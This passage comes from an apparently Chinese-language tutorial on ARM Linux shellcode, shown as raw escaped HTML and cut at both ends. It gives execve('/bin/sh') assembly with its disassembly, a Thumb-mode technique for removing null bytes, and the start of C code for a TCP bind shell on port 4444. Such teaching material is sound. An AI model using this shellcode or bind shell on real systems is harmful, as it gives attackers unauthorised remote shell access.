    &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.ascii&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh\0&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;execve:&lt;/span&gt;     file format elf32-littlearm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;Disassembly&lt;/span&gt; of section &lt;span class=&#34;meta&#34;&gt;.text&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00010054&lt;/span&gt; &amp;lt;_start&amp;gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;10054&lt;/span&gt;: e28f000c &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;10058&lt;/span&gt;: e3a01000 &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;1005&lt;/span&gt;c: e3a02000 &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;10060&lt;/span&gt;: e3a0700b &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;10064&lt;/span&gt;: ef000000 &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;10068&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;e69622f &lt;span class=&#34;meta&#34;&gt;.word&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x6e69622f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;1006&lt;/span&gt;c: &lt;span class=&#34;number&#34;&gt;0068732&lt;/span&gt;f &lt;span class=&#34;meta&#34;&gt;.word&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0068732f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;还是有很多NULL字符在里头的。&lt;/p&gt;
&lt;h3 id=&#34;3-去除NULL字符数据&#34;&gt;&lt;a href=&#34;#3-去除NULL字符数据&#34; class=&#34;headerlink&#34; title=&#34;3. 去除NULL字符数据&#34;&gt;&lt;/a&gt;3. 去除NULL字符数据&lt;/h3&gt;&lt;p&gt;我们可以用来减少空字节出现在shell代码中的一种技术是使用拇指模式。使用拇指模式可以减少空字节的机会，因为拇指指令长2字节，而不是4字节。&lt;/p&gt;
&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.section&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;.text&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.global&lt;/span&gt; _start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;_start:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;meta&#34;&gt;.code&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;bx&lt;/span&gt;  &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;meta&#34;&gt;.code&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;eor&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;eor&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r5&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.ascii&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh\0&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;去空后，效果还是不错的。&lt;/p&gt;
&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10054&lt;/span&gt;: e28f3001  &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10058&lt;/span&gt;: e12fff13  &lt;span class=&#34;keyword&#34;&gt;bx&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1005&lt;/span&gt;c: a002       &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#8&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;; (adr r0, 10068 &amp;lt;_start+0x14&amp;gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1005&lt;/span&gt;e: &lt;span class=&#34;number&#34;&gt;4049&lt;/span&gt;       &lt;span class=&#34;keyword&#34;&gt;eors&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10060&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;4052&lt;/span&gt;       &lt;span class=&#34;keyword&#34;&gt;eors&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10062&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;270&lt;/span&gt;b       &lt;span class=&#34;keyword&#34;&gt;movs&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10064&lt;/span&gt;: df01       &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10066&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;c2d       &lt;span class=&#34;keyword&#34;&gt;adds&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r5&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r5&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10068&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;e69622f  &lt;span class=&#34;meta&#34;&gt;.word&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x6e69622f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1006&lt;/span&gt;c: &lt;span class=&#34;number&#34;&gt;0068732&lt;/span&gt;f  &lt;span class=&#34;meta&#34;&gt;.word&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0068732f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;提取shellcode：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;objcopy -O binary execve3 execve3.bin &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;bind-shell-to-tcp&#34;&gt;&lt;a href=&#34;#bind-shell-to-tcp&#34; class=&#34;headerlink&#34; title=&#34;bind shell to tcp&#34;&gt;&lt;/a&gt;bind shell to tcp&lt;/h2&gt;&lt;p&gt;过程：&lt;/p&gt;
&lt;p&gt;创建新的TCP套接字&lt;br&gt;绑定socket到本地端口&lt;br&gt;等待传入的连接&lt;br&gt;接受传入的连接&lt;br&gt;将STDIN STDOUT STDERR从客户端重定向到新创建的套接字&lt;br&gt;生成shell&lt;/p&gt;
&lt;figure class=&#34;highlight c++&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; host_sockid;    &lt;span class=&#34;comment&#34;&gt;// socket file descriptor &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; client_sockid;  &lt;span class=&#34;comment&#34;&gt;// client file descriptor &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;hostaddr&lt;/span&gt;;&lt;/span&gt;            &lt;span class=&#34;comment&#34;&gt;// server aka listen address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Create new TCP socket &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    host_sockid = &lt;span class=&#34;built_in&#34;&gt;socket&lt;/span&gt;(PF_INET, SOCK_STREAM, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Initialize sockaddr struct to bind socket using it &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hostaddr.sin_family = AF_INET;                  &lt;span class=&#34;comment&#34;&gt;// server socket type address family = internet protocol address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hostaddr.sin_port = &lt;span class=&#34;built_in&#34;&gt;htons&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4444&lt;/span&gt;);                &lt;span class=&#34;comment&#34;&gt;// server port, converted to network byte order&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hostaddr.sin_addr.s_addr = &lt;span class=&#34;built_in&#34;&gt;htonl&lt;/span&gt;(INADDR_ANY);   &lt;span class=&#34;comment&#34;&gt;// listen to any address, converted to network byte order&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Bind socket to IP/Port in sockaddr struct &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;bind&lt;/span&gt;(host_sockid, (struct sockaddr*) &amp;amp;hostaddr, &lt;span class=&#34;built_in&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;&lt;/span&gt;(hostaddr)); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Listen for incoming connections &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;listen&lt;/span&gt;(host_sockid, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Accept incoming connection &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    client_sockid = &lt;span class=&#34;built_in&#34;&gt;accept&lt;/span&gt;(host_sockid, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Duplicate file descriptors for STDIN, STDOUT and STDERR &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dup2&lt;/span&gt;(client_sockid, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dup2&lt;/span&gt;(client_sockid, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dup2&lt;/span&gt;(client_sockid, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Execute /bin/sh &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;execve&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;close&lt;/span&gt;(host_sockid); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span 